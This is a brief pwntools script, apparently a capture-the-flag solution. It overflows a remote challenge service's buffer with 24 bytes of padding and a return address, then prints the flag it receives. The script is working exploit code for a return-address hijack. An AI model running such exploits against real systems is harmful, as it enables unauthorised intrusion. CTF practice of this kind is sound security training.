from pwn import *

io= remote('challenge-club.trustline.sa', 4000)

payload= b'a'*24
payload +=p64(0x0000000000401309)

io.sendline(payload)
io.recvuntil(b'club!\n')
flag =io.recvall().strip().decode()
log.info(f'Flag => {flag}')
io.close()